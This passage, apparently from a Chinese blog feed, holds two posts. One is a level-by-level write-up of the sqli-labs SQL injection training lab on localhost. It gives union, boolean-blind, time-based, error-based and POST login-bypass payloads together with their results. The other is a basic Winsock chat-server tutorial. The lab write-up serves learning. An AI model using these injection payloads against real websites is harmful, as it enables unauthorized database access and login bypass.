class="regexp">/index.php?id=1"</span></span><br></pre></td></tr></table></figure><p>报错信息是</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1</p></blockquote><p>所以我们可以猜测，是基于”)的注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-4/index.php?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>即可注入出表名。<br>但是我觉得我想不明白<br>注入语句是：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> * FROM users <span class="keyword">WHERE</span> id=($id) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>当id=1’–+时，sql语句为</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;          #id=<span class="string">"1'--+"</span></span><br><span class="line"><span class="keyword">SELECT</span> * FROM users <span class="keyword">WHERE</span> id=(<span class="string">"1'--+"</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>即为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE id=(<span class="string">"1'</span></span><br></pre></td></tr></table></figure><p>这为什么不报错</p><p>最后实验发现，由于$id = ‘“‘ . $id . ‘“‘;  注释符在双引号内，导致注释符被看作字符串的一部分而非特殊符号。。。</p><p>前面的字符型注入没有出现这个问题是因为字符型注入的sql语句是这么写的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>本题多了一个<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">id = <span class="string">'"'</span> . <span class="variable">$id</span> . <span class="string">'"'</span>;</span></span><br></pre></td></tr></table></figure></p><p>相当于把id里的内容str化，所以特殊符号都失效了。输入双引号报错原因是id=”1””字符串双引号不匹配，所以会报错</p><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>一进去，就是一个大大的</p><blockquote><p>You are in………..</p></blockquote><p>让我不禁想起了布尔盲注，不如试试看喽。</p><p>先加一个’</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/index.php?id=1'--+</span></span><br></pre></td></tr></table></figure><p>熟悉的You are in………..又回来了，也就是说这是一个字符型注入，先判断一下数据库的长度</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">5</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>发现正确的You are in………..，也就是说数据库长度是8，那咱们看看数据库名字的首字母是什么<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">5</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></p><p>有回显，也就是说首字母的ascii是115，也就是s（以此类推<br>）//我就不爆表名了啊，咕咕咕</p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1"</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1"--+</span></span><br></pre></td></tr></table></figure><p>加双引号报错，再加注释符恢复正常，于是与Less-5其实一样的<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1" and length(database())=8--+</span></span><br></pre></td></tr></table></figure></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">6</span><span class="regexp">/index.php?id=1" and ascii(substr(database(),1,1))=115--+</span></span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-labs-master/</span>Less-<span class="number">7</span><span class="regexp">/index.php?id=1'</span></span><br></pre></td></tr></table></figure><p>报错信息被关掉了，注释符也被过滤，但是加单引号报错，我们也就是说不出意外是字符型注入<br>尝试<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1/sqli</span>-labs-master/Less-<span class="number">7</span>/index.php?id=<span class="number">1</span><span class="string">' and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>最后剩下的单引号去补全语句<br>所以我们可以尝试一下布尔盲注</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">7</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span> <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure><p>发现正确，也就是说数据库名字长度是8，接下来同Less-5</p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">8</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> length(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>正常显示you are in，报错无回显</p><p>当=8不报错，=9报错，感觉和之前的盲注没有任何区别<br>于是 同上</p><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>延时注入，这次无论出不出错回显都是一样的，不能用布尔盲注的方法，尝试使用延时注入</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> sleep(<span class="number">5</span>) <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure><p>发现成功延时，我们就可以用延时注入了，试试看数据库的长度</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?id=<span class="number">1</span>' <span class="keyword">and</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">'1'</span>='<span class="number">1</span></span><br></pre></td></tr></table></figure><p>即如果数据库长度是8，则延时5s，否则什么都不干。延时注入耗时长，并且稳定性不高，因为无法判断是网络卡还是真的延时，如果把延时时间设的较高，可以排除网络卡顿的因素，但是耗时长，导致效率较低。</p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>同第十个，延时注入，把单引号换成双引号即可。<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?<span class="attr">id=1"</span> <span class="literal">and</span> sleep(<span class="number">5</span>) <span class="literal">and</span> <span class="string">"1"</span>=<span class="string">"1</span></span><br></pre></td></tr></table></figure></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs-master/Less-<span class="number">9</span>/index.php?<span class="attr">id=1"</span> <span class="literal">and</span> <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="literal">and</span> <span class="string">"1"</span>=<span class="string">"1</span></span><br></pre></td></tr></table></figure><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>一进去是一个登录框(我猜是post注入)</p><p>那就试试吧。<br>输入一下</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line">password:<span class="number">123456</span></span><br></pre></td></tr></table></figure><p>然后回显</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Login</span> <span class="selector-tag">name</span><span class="selector-pseudo">:Dumb</span></span><br><span class="line"><span class="selector-tag">Your</span> <span class="selector-tag">Password</span><span class="selector-pseudo">:Dumb</span></span><br></pre></td></tr></table></figure><p>这个是默认的用户名和密码，在实际的渗透测试中就等于是管理员用户的账号密码。那么这里存在post注入，post注入需要借助抓包工具。让我们打开可爱的bp。<br>发现post上去的数据包长这个样子</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="variable">&amp;passwd</span>=admin<span class="variable">&amp;submit</span>=Submit</span><br></pre></td></tr></table></figure><p>发送到repeater中尝试post注入，试试<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin <span class="keyword">and</span> <span class="attribute">1</span>=2 union select &amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br><span class="line">1,2</span><br></pre></td></tr></table></figure></p><p>发现回显，也就是说存在union联合查询注入，但是还存在报错注入。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin 'and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> database()))) --+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure></p><p>extractvalue函数需要一个xpath路径，而concat组合出来的database并不是xpath形式，所以会报错，但是这种报错注入的方式仅仅能用在显错注入上<br>报错注入的结果是</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XPATH</span> syntax <span class="literal">error</span>: <span class="string">'~security'</span></span><br></pre></td></tr></table></figure><p>当然最简单的方式是直接sqlmap跑……</p><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>输入admin’ or 1=1#发现没有回显，那我们试试双引号，发现直接报错，是需要双引号+括号的形式:”)</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin<span class="string">") or 1=1#</span></span><br><span class="line">password:admin</span><br></pre></td></tr></table></figure><p>发现直接登陆上了管理员的账户，存在post注入，我们试一试报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：admin") and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>())))#</span><br><span class="line"><span class="keyword">password</span>:<span class="keyword">admin</span></span><br></pre></td></tr></table></figure></p><p>结果是</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XPATH</span> syntax <span class="literal">error</span>: <span class="string">'~security'</span></span><br></pre></td></tr></table></figure><p>一切OK</p><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>基于’)的注入，报错注入一行完事</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin') <span class="keyword">and</span> extractvalue(1,concat(0x7e,(select database())))#&amp;<span class="attribute">passwd</span>=456&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>当然此题也能时间盲注，但是有其他注入方法的情况下极度不推荐时间盲注，因为实在是，太慢了</p><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>注释符不可用，所以随意闭合一下就好，基于”的盲注</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin" <span class="keyword">and</span> extractvalue(1,concat(0x7e,(select database()))) <span class="keyword">and</span> <span class="string">"1"</span>=<span class="string">"1  &amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>得出结果。</p><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>实在不想一点点去FUZZ了，我就使用了偷看sql语句大法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'$uname'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$passwd'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>嗯 盲注，单引号<br>上一波时盲payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=admin' <span class="keyword">and</span> sleep(5)--+&amp;<span class="attribute">passwd</span>=456&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>嗯，延时了，能时盲，<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin' and if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)='s',sleep(<span class="number">5</span>),<span class="number">1</span>)--+&amp;passwd=<span class="number">456</span>&amp;submit=Submit</span><br></pre></td></tr></table></figure></p><p>嗯，延时了，能推断出第一个字母是s，解决问题。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Sqli-lab-1-65关放弃指北&quot;&gt;&lt;a href=&quot;#Sqli-lab-1-65关放弃指北&quot; class=&quot;headerlink&quot; title=&quot;Sqli-lab 1-65关放弃指北&quot;&gt;&lt;/a&gt;&lt;strong&gt;Sqli-lab&lt;/strong&gt; 1-65关放弃指北&lt;/h2&gt;&lt;p&gt;Sqli-lab通关writeup，寒假觉得自己太堕落了，对sql注入也仅仅只掌握了最基本的原理，所以决定把sqli刷一遍。&lt;br&gt;并且为了方便注入，我在sql语句后加入了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;echo $sql;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这样可以方便学习。并且由于关卡数量比较庞大，每个关卡爆到表名就算完成任务（反正刷src也不能脱裤对吧）&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="sql注入" scheme="/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>套接字编程学习</title>
    <link href="/2019/11/01/%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    <id>/2019/11/01/套接字编程学习/</id>
    <published>2019-11-01T13:28:50.000Z</published>
    <updated>2019-11-12T03:43:31.861Z</updated>
    
    <content type="html"><![CDATA[<h2 id="套接字编程学习"><a href="#套接字编程学习" class="headerlink" title="套接字编程学习"></a>套接字编程学习</h2><p>使用的是Windows的线程库，但是实现地较为简单和整体的架构也比较混乱，写一篇blog稍微总结一下。</p><a id="more"></a> <hr><h3 id="套接字概念"><a href="#套接字概念" class="headerlink" title="套接字概念"></a>套接字概念</h3><blockquote><p>套接字（socket）是一个抽象层，应用程序可以通过它发送或接收数据，可对其进行像对文件一样的打开、读写和关闭等操作。套接字允许应用程序将I/O插入到网络中，并与网络中的其他应用程序进行通信。网络套接字是IP地址与端口的组合。 </p></blockquote><blockquote><p>通信时，其中的一个网络应用程序将要传输的一段信息写入它所在主机的Socket中，该Socket通过网络接口卡的传输介质将这段信息发送给另一台主机的Socket中，使这段信息能传送到其他程序中。 </p></blockquote><p>用人话讲其实就是所谓套接字就是传输层的端点，两个传输层的连接过程是，先把要传输的数据传给套接字，让套接字去传输信息，另一个传输层的套接字接受这个信息。</p><h4 id="套接字的分类"><a href="#套接字的分类" class="headerlink" title="套接字的分类"></a>套接字的分类</h4><blockquote><p>流式套接字： 它提供了一种可靠的、面向连接的双向数据传输服务，实现了数据无差错、无重复的发送。 也就是说流式套接字建立了一种安全可靠的连接。（TCP）</p></blockquote><blockquote><p>数据报套接字： 它提供了一种无连接、不可靠的双向数据传输服务。数据包以独立的形式被发送，并且保留了记录边界，不提供可靠性保证。 （UDP）</p></blockquote><blockquote><p>原始套接字: 该套接字允许对较低层协议（如IP或ICMP）进行直接访问，常用于网络协议分析，检验新的网络协议实现，也可用于测试新配置或安装的网络设备。 </p></blockquote><hr><h3 id="套接字编程流程"><a href="#套接字编程流程" class="headerlink" title="套接字编程流程"></a>套接字编程流程</h3><p>先上一个套接字编程的流程图</p><p><img src="https://s2.ax1x.com/2019/11/01/KH67WR.jpg" alt="套接字编程流程图"></p><p>然后介绍一下具体的流程</p><p>Server:</p><blockquote><p>引用头文件和加载动态链接库</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"winsock2.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">"ws2_32.lib"</span>)</span></span><br></pre></td></tr></table></figure><blockquote><p>指定套接字版本并初始化动态链接库</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WSADATA WSAData;</span><br><span class="line">WORD SocketVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">WSAStartup(SocketVersion,&amp;WSAData);</span><br></pre></td></tr></table></figure><blockquote><p>建立一个套接字</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br></pre></td></tr></table></figure><blockquote><p>配置套接字所需要的参数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 12345</span></span><br><span class="line">server.sin_family = AF_INET;<span class="comment">/*使用IPV4*/</span></span><br><span class="line">server.sin_port = htons(PORT);<span class="comment">/*使用12345端口并把主机字节序转化为网络字节序*/</span></span><br><span class="line">server.sin_addr.s_addr = htonl(INADDR_ANY);<span class="comment">/*接受到本机所有网卡的数据*/</span></span><br></pre></td></tr></table></figure><blockquote><p>绑定一个套接字</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RetVal = bind(sListen,(struct sockaddr *)&amp;server,size);</span><br></pre></td></tr></table></figure><blockquote><p>设置监听</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen(sListen, maxnumber);</span><br></pre></td></tr></table></figure><blockquote><p>关闭连接与清除初始化动态链接库时分配的资源</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">closesocket(sListen);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure><p>Client:</p><blockquote><p>client与Server不同的地方有connect，连接服务器</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCKET sClient;</span><br><span class="line">SOCKADDR_IN server;</span><br><span class="line">connect(sClient, (struct sockaddr*) &amp; server, <span class="keyword">sizeof</span>(SOCKADDR_IN))</span><br></pre></td></tr></table></figure><hr><p>我写了一个可以客户端可以随意给服务端发消息，客户端可以通过指令和指定的另外的客户端发消息，但是因为线程不能创建线程，所以只能发一条回一条。</p><blockquote><p>首先创建一个线程用来接受所有客户端的消息。接受消息的同时会记录下该客户端的惟一标识号，便于之后查询当前在线用户和用户通信的实现。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">thread <span class="title">task01</span><span class="params">(receiveprocess, sClient)</span></span>;  <span class="comment">/*接收消息子线程*/</span></span><br><span class="line">task01.detach();</span><br></pre></td></tr></table></figure><p>顺便写一下detach和join的区别</p><blockquote><p>detach：主线程与子线程分离，子线程结束后，资源自动回收。</p><p>join：子线程合入主线程，主线程阻塞等待子线程结束，然后回收子线程资源。 </p></blockquote><p>说人话就是detach和主线程没关系，资源回收会由系统自动回收。join是主线程阻塞，等着回收该线程资源。</p><blockquote><p>在receiveprocess函数中我接受一个客户端的消息，但因为我接收消息使用的是一个公共的全局缓冲区，所以约等于接受所有客户端的消息。第二个语句将字符串末尾加上字符串结束符，保证字符串正确显示。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RetVal = recv(sClient, ReceiveBuff, MSGSIZE, <span class="number">0</span>);</span><br><span class="line">ReceiveBuff[RetVal] = <span class="string">'\0'</span>;</span><br></pre></td></tr></table></figure><blockquote><p>接着用户可以输入指令，在receiveprocess中将用户输入与固定字符串进行比对。比如用户输入communicate会与某个用户进行通信。（由服务器转发实现）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(ReceiveBuff, communicate))<span class="comment">/*通过communicate指令与当前当前在线用户通信*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> want = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> a = findusernumber(sClient);<span class="comment">/*该用户唯一标识码*/</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a = "</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">s = <span class="string">"请输入您的想要与谁通信"</span>;</span><br><span class="line">sendtouser(s, sClient);</span><br><span class="line">want = reciveonenumber(sClient, a);<span class="comment">/*该用户想要与谁通信*/</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"用户"</span>&lt;&lt;a&lt;&lt; <span class="string">"想与"</span> &lt;&lt; want &lt;&lt; <span class="string">"通信"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">communicateuseranduser(information[a].user, information[want].user, a, want);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>而服务端发消息只需要使用send函数即可，所以只要有用户提出通信请求，记录下该用户的唯一标识码和该用户想要通信的用户的唯一标识码，使用服务端的send函数可以实现服务端的转发。但是我还没有实现两个客户端之间可以随意所欲地发消息。如果想要随意所欲发消息，那么需要再创建两个线程，一个接收消息一个发送消息。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(b, information[a1].ReceiveBuff, <span class="built_in">strlen</span>(information[a1].ReceiveBuff), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><blockquote><p>因为只有单线程进行通信，但又要同时接受和发送，我只能利用一个变量的自增。（有时间我改成双线程），information[i].ReceiveBuff是某一个用户私有的缓冲区，i是该用户在用户的数据结构中所处的序号。客户端发起通信请求–&gt;服务端接收请求并转发消息至另一个客户端–&gt;另一个客户端收到请求。由此可实现客户端与客户端的通信。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (flagp % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">receiveuseranduser(a, a1);</span><br><span class="line">flagp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">receiveuseranduser(b, b1);</span><br><span class="line">flagp++;</span><br><span class="line">&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">receiveuseranduser</span><span class="params">(SOCKET sClient,<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line"><span class="comment">/*接收线程消息函数*/</span></span><br><span class="line">RetVal = recv(sClient, information[i].ReceiveBuff, MSGSIZE, <span class="number">0</span>);</span><br><span class="line">information[i].ReceiveBuff[RetVal] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>勉勉强强搭好了一个框，剩下的就是糊纸了。数据结构改一改就可以变成邮件管理系统什么的。</p><p>文件传输功能尚未完成，有时间就写（咕）。之后我会把优化版的代码贴上来，如果我想得起来的话。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;套接字编程学习&quot;&gt;&lt;a href=&quot;#套接字编程学习&quot; class=&quot;headerlink&quot; title=&quot;套接字编程学习&quot;&gt;&lt;/a&gt;套接字编程学习&lt;/h2&gt;&lt;p&gt;使用的是Windows的线程库，但是实现地较为简单和整体的架构也比较混乱，写一篇blog稍微总结一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
